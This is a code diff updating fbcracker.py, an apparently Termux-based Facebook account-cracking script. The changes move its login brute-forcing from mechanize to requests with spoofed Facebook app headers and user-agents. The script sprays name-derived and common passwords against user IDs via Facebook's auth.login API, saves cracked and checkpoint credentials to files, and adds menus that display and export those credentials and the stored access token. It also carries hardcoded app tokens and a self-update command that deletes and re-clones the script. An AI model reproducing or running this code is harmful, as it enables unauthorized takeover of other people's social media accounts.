@@ -7,25 +7,14 @@
 
 
 try:
-	import os,sys,time,platform,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string,subprocess,mechanize
+	import os,sys,time,platform,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string,subprocess
 	from multiprocessing.pool import ThreadPool
 	from requests.exceptions import ConnectionError
-        from mechanize import Browser
 except ImportError:
 	os.system("python2 fbcracker.py")
 
 from os import system
 from time import sleep
-
-
-reload(sys)
-sys.setdefaultencoding('utf8')
-br = mechanize.Browser()
-br.set_handle_robots(False)
-br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
-br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
-br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
-
 
 def xox(z):
     for e in z + "\n":
@@ -61,9 +50,10 @@ def main():
 	print("\t\033[93;1m      MAIN MENU\x1b[0m")
 	print("")
 	print("\033[92;1m  [1] START CRACK")
-	print("\033[93;1m  [2] HOW TO GET ACCESS TOKEN")
-	print("\033[94;1m  [3] UPDATE TOOL 1.3")
-	print("\033[96;1m  [4] CHAT ME UP ON WHATSAPP \033[92;1m✘\033[91;1m✘")
+        print("\033[91;1m  [2] VIEW & SAVE CHECKPOINTS")
+	print("\033[93;1m  [3] HOW TO GET ACCESS TOKEN")
+	print("\033[94;1m  [4] UPDATE TOOL")
+	print("\033[96;1m  [5] CHAT ME UP ON WHATSAPP \033[92;1m✘\033[91;1m✘")
 	print("\033[90;1m  [0] EXIT")
 	print("")
 	log_sel()
@@ -76,9 +66,11 @@ def log_sel():
 	elif sel =="1" or sel =="01":
 		token()
 	elif sel =="2" or sel =="02":
+		check_cps()
+	elif sel =="3" or sel =="03":
 		subprocess.check_output(["am", "start", "https://smashballoon.com/custom-facebook-feed/page-token/"])
 		main()
-	elif sel =="3" or sel =="03":
+	elif sel =="4" or sel =="04":
 		import os
 		try:
 			os.system("rm -rf fbcracker.py ; git clone https://github.com/chidexzy/fbcracker ; cd fbcracker ; cp fbcracker.py /data/data/com.termux/files/home/fbcracker ; cd ; cd fbcracker ; rm -rf fbcracker")
@@ -87,7 +79,7 @@ def log_sel():
 		except KeyboardInterrupt:
 			print("\033[91;1m\n YOUR DEVICE IS NOT SUPPORTED!\n")
 	        	main()
-	elif sel =="4" or sel =="04":
+	elif sel =="5" or sel =="05":
 		subprocess.check_output(["am", "start", "https://wa.me/qr/BLRFNOUYDCRPO1"])
 		main()
 	elif sel =="0" or sel =="00":
@@ -98,6 +90,22 @@ def log_sel():
 		print("\t\033[91;1m  SELECT VALID OPTION")
 		print("")
 		log_sel()
+
+def check_cps():
+        os.system('clear')
+	logo()
+	print("")
+	print("")
+	print("\t\033[93;1m YOUR CHECKPOINTS")
+	print("")
+	cps = open('rat.txt','r').read()
+	print "\033[1;97m"+cps
+        print("")
+	raw_input("\n\033[92;1m Press ENTER to Save and go Back")
+        os.system("cp rat.txt /storage/emulated/0")
+        xox("\n\033[91;1m CHECKPOINTS SAVED SUCCESSFULLY 👍")
+        time.sleep(2)
+	main()
 
 def token():
     os.system("clear")
@@ -158,6 +166,7 @@ def menu():
     print("\033[92;1m  [1] CRACK WITH PASSWORD 1")
     print("\033[93;1m  [2] CRACK WITH PASSWORD 2")
     print("\033[94;1m  [3] CRACK WITH ALL PASSWORDS")
+    print("\033[96;1m  [4] SHOW TOKEN")
     print('\033[91;1m  [0] BACK')
     print("")
     menu_option()
@@ -170,6 +179,16 @@ def menu_option():
 		crack()
 	elif select =="3":
 	    crack2()
+	elif select =="4":
+		os.system('clear')
+		logo()
+		print("")
+		print("")
+		token=open('token.txt','r').read()
+		print "\033[1;92mYour token\033[1;91m :\033[1;97m "+token
+                print("")
+		raw_input("\n\t\033[92;1m Press ENTER to go Back")
+		menu()
 	elif select =="0":
 		main()
 	else:
@@ -268,8 +287,10 @@ def crack_select1():
 		_azimua = random.choice(["Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]", "[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]", "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]", "Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/305.1.0.40.120;]", "Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/170.0.0.60.91;FBBV/105964764;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Sprint;FBID/phone;FBLC/en_US;FBOP/5;FBRV/106631002]", "Mozilla/5.0 (Linux; Android 7.1.1; ASUS Chromebook Flip C302 Build/R70-11021.56.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]"])
 		try:
 			pass1 = name.lower().split(' ')[0] + '1234'
-			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + uid + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-             		d = json.load(data)
+			api = 'https://b-api.facebook.com/method/auth.login'
+			params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass1, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
+			headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
+			data = requests.get(api, params=params, headers=headers_)
 			if "access_token" in data.text and "EAAA" in data.text:
 				print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass1+"\033[0;97m")
 				ok = open("ok.txt", "a")
@@ -277,7 +298,7 @@ def crack_select1():
 				ok.close()
 				oks.append(uid+pass1)
 			else:
-				if "www.facebook.com" in d['error_msg']:
+				if "www.facebook.com" in data.json()['error_msg']:
 					print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass1+"\033[0;97m")
 					cp = open("rat.txt", "a")
 					cp.write(uid+"|"+pass1+"\n")
@@ -285,8 +306,10 @@ def crack_select1():
 					cps.append(uid+pass1)
 				else:
 					pass2 = name.lower().split(' ')[0] + '123'
-					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + uid + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-					d = json.load(data)
+					api = 'https://b-api.facebook.com/method/auth.login'
+					params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass2, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
+					headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
+					data = requests.get(api, params=params, headers=headers_)
 					if "access_token" in data.text and "EAAA" in data.text:
 						print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass2+"\033[0;97m")
 						ok = open("ok.txt", "a")
@@ -294,7 +317,7 @@ def crack_select1():
 						ok.close()
 						oks.append(uid+pass2)
 					else:
-						if "www.facebook.com" in d['error_msg']:
+						if "www.facebook.com" in data.json()['error_msg']:
 							print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass2+"\033[0;97m")
 							cp = open("rat.txt", "a")
 							cp.write(uid+"|"+pass2+"\n")
@@ -302,8 +325,10 @@ def crack_select1():
 							cps.append(uid+pass2)
 						else:
 							pass3 = name.lower().split(' ')[0] + '12'
-							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + uid + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-							d = json.load(data)
+							api = 'https://b-api.facebook.com/method/auth.login'
+							params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass3, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
+							headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
+							data = requests.get(api, params=params, headers=headers_)
 							if "access_token" in data.text and "EAAA" in data.text:
 								print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass3+"\033[0;97m")
 								ok = open("ok.txt", "a")
@@ -311,7 +336,7 @@ def crack_select1():
 								ok.close()
 								oks.append(uid+pass3)
 							else:
-								if "www.facebook.com" in d['error_msg']:
+								if "www.facebook.com" in data.json()['error_msg']:
 									print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass3+"\033[0;97m")
 									cp = open("rat.txt", "a")
 									cp.write(uid+"|"+pass3+"\n")
@@ -319,8 +344,10 @@ def crack_select1():
 									cps.append(uid+pass3)
 								else:
 									pass4 = name.lower().split(' ')[1] + '1234'
-									data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + uid + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-									d = json.load(data)
+									api = 'https://b-api.facebook.com/method/auth.login'
+									params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass4, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
+									headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
+									data = requests.get(api, params=params, headers=headers_)
 									if "access_token" in data.text and "EAAA" in data.text:
 										print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass4+"\033[0;97m")
 										ok = open("ok.txt", "a")
@@ -328,7 +355,7 @@ def crack_select1():
 										ok.close()
 										oks.append(uid+pass4)
 									else:
-										if "www.facebook.com" in d['error_msg']:
+										if "www.facebook.com" in data.json()['error_msg']:
 											print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass4+"\033[0;97m")
 											cp = open("rat.txt", "a")
 											cp.write(uid+"|"+pass4+"\n")
@@ -336,8 +363,10 @@ def crack_select1():
 											cps.append(uid+pass4)
 										else:
 											pass5 = name.lower().split(' ')[1] + '123'
-											data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + uid + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-											d = json.load(data)
+											api = 'https://b-api.facebook.com/method/auth.login'
+											params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass5, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
+											headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
+											data = requests.get(api, params=params, headers=headers_)
 											if "access_token" in data.text and "EAAA" in data.text:
 												print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass5+"\033[0;97m")
 												ok = open("ok.txt", "a")
@@ -345,7 +374,7 @@ def crack_select1():
 												ok.close()
 												oks.append(uid+pass5)
 											else:
-												if "www.facebook.com" in d['error_msg']:
+												if "www.facebook.com" in data.json()['error_msg']:
 													print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass5+"\033[0;97m")
 													cp = open("rat.txt", "a")
 													cp.write(uid+"|"+pass5+"\n")
@@ -353,8 +382,10 @@ def crack_select1():
 													cps.append(uid+pass5)
 												else:
 													pass6 = name.lower().split(' ')[1] + '12'
-													data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + uid + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-													d = json.load(data)
+													api = 'https://b-api.facebook.com/method/auth.login'
+													params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass6, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
+													headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
+													data = requests.get(api, params=params, headers=headers_)
 													if "access_token" in data.text and "EAAA" in data.text:
 														print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass6+"\033[0;97m")
 														ok = open("ok.txt", "a")
@@ -362,7 +393,7 @@ def crack_select1():
 														ok.close()
 														oks.append(uid+pass6)
 													else:
-														if "www.facebook.com" in d['error_msg']:
+														if "www.facebook.com" in data.json()['error_msg']:
 															print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass6+"\033[0;97m")
 															cp = open("rat.txt", "a")
 															cp.write(uid+"|"+pass6+"\n")
@@ -370,8 +401,10 @@ def crack_select1():
 															cps.append(uid+pass6)
 														else:
 															pass7 = name.lower()
-															data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + uid + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-															d = json.load(data)
+															api = 'https://b-api.facebook.com/method/auth.login'
+															params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass7, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
+															headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
+															data = requests.get(api, params=params, headers=headers_)
 															if "access_token" in data.text and "EAAA" in data.text:
 																print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass7+"\033[0;97m")
 																ok = open("ok.txt", "a")
@@ -379,7 +412,7 @@ def crack_select1():
 																ok.close()
 																oks.append(uid+pass7)
 															else:
-																if "www.facebook.com" in d['error_msg']:
+																if "www.facebook.com" in data.json()['error_msg']:
 																	print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass7+"\033[0;97m")
 																	cp = open("rat.txt", "a")
 																	cp.write(uid+"|"+pass7+"\n")
@@ -387,8 +420,10 @@ def crack_select1():
 																	cps.append(uid+pass7)
 																else:
 																	pass8 = name.lower().split(' ')[0] + name.lower().split(' ')[1]
-																	data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + uid + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-																	d = json.load(data)
+																	api = 'https://b-api.facebook.com/method/auth.login'
+																	params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass8, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
+																	headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
+																	data = requests.get(api, params=params, headers=headers_)
 																	if "access_token" in data.text and "EAAA" in data.text:
 																		print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass8+"\033[0;97m")
 																		ok = open("ok.txt", "a")
@@ -396,7 +431,7 @@ def crack_select1():
 																		ok.close()
 																		oks.append(uid+pass8)
 																	else:
-																		if "www.facebook.com" in d['error_msg']:
+																		if "www.facebook.com" in data.json()['error_msg']:
 																			print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass8+"\033[0;97m")
 																			cp = open("rat.txt", "a")
 																			cp.write(uid+"|"+pass8+"\n")
@@ -404,8 +439,10 @@ def crack_select1():
 																			cps.append(uid+pass8)
 																		else:
 																  			pass9 = "102030"
-																  			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + uid + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-																			d = json.load(data)
+																  			api = 'https://b-api.facebook.com/method/auth.login'
+																  			params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass9, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
+																  			headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
+																  			data = requests.get(api, params=params, headers=headers_)
 																			if "access_token" in data.text and "EAAA" in data.text:
 																  			    print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass9+"\033[0;97m")
 																  			    ok = open("ok.txt", "a")
@@ -413,7 +450,7 @@ def crack_select1():
 																  			    ok.close()
 																  			    oks.append(uid+pass9)
 																			else:
-																  			        if "www.facebook.com" in d['error_msg']:
+																  			        if "www.facebook.com" in data.json()['error_msg']:
 																  			                print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass9+"\033[0;97m")
 																  			                cp = open("rat.txt", "a")
 																  			                cp.write(uid+"|"+pass9+"\n")
@@ -421,8 +458,10 @@ def crack_select1():
 																  			                cps.append(uid+pass9)
 																  			        else:		
 																					pass10 = 223344
-																					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + uid + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-																					d = json.load(data)
+																					api = 'https://b-api.facebook.com/method/auth.login'
+																					params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass10, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
+																					headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
+																					data = requests.get(api, params=params, headers=headers_)
 																					if "access_token" in data.text and "EAAA" in data.text:
 																						print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass10+"\033[0;97m")
 																						ok = open("ok.txt", "a")
@@ -430,7 +469,7 @@ def crack_select1():
 																						ok.close()
 																						oks.append(uid+pass10)
 																  			 		else:
-																  			        		if "www.facebook.com" in d['error_msg']:
+																  			        		if "www.facebook.com" in data.json()['error_msg']:
 																							print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass10+"\033[0;97m")
 																							cp = open("rat.txt", "a")
 																							cp.write(uid+"|"+pass10+"\n")
@@ -438,8 +477,10 @@ def crack_select1():
 																							cps.append(uid+pass10)
 																						else:
 																							pass11 = "556677"
-																							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + uid + '&locale=en_US&password=' + pass11 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-																							d = json.load(data)
+																							api = 'https://b-api.facebook.com/method/auth.login'
+																							params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass11, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
+																							headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
+																							data = requests.get(api, params=params, headers=headers_)
 																							if "access_token" in data.text and "EAAA" in data.text:
 																								print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass11+"\033[0;97m")
 																								ok = open("ok.txt", "a")
@@ -447,7 +488,7 @@ def crack_select1():
 																								ok.close()
 																								oks.append(uid+pass11)
 																							else:
-																								if "www.facebook.com" in d['error_msg']:
+																								if "www.facebook.com" in data.json()['error_msg']:
 																									print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass11+"\033[0;97m")
 																									cp = open("rat.txt", "a")
 																									cp.write(uid+"|"+pass11+"\n")
@@ -455,8 +496,10 @@ def crack_select1():
 																									cps.append(uid+pass1)
 																								else:
 																									pass12 = "786786"
-																									data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + uid + '&locale=en_US&password=' + pass12 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-																									d = json.load(data)
+																									api = 'https://b-api.facebook.com/method/auth.login'
+																									params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass12, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
+																									headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
+																									data = requests.get(api, params=params, headers=headers_)
 																									if "access_token" in data.text and "EAAA" in data.text:
 																										print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass12+"\033[0;97m")
 																										ok = open("ok.txt", "a")
@@ -464,7 +507,7 @@ def crack_select1():
 																										ok.close()
 																										oks.append(uid+pass12)
 																									else:
-																										if "www.facebook.com" in d['error_msg']:
+																										if "www.facebook.com" in data.json()['error_msg']:
 																											print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass12+"\033[0;97m")
 																											cp = open("rat.txt", "a")
 																											cp.write(uid+"|"+pass12+"\n")
@@ -472,8 +515,10 @@ def crack_select1():
 																											cps.append(uid+pass12)
 																										else:
 																											pass13 = "123456"
-																											data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + uid + '&locale=en_US&password=' + pass13 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-																											d = json.load(data)
+																											api = 'https://b-api.facebook.com/method/auth.login'
+																											params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass13, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
+																											headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
+																											data = requests.get(api, params=params, headers=headers_)
 																											if "access_token" in data.text and "EAAA" in data.text:
 																												print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass13+"\033[0;97m")
 																												ok = open("ok.txt", "a")
@@ -481,7 +526,7 @@ def crack_select1():
 																												ok.close()
 																												oks.append(uid+pass13)
 																											else:
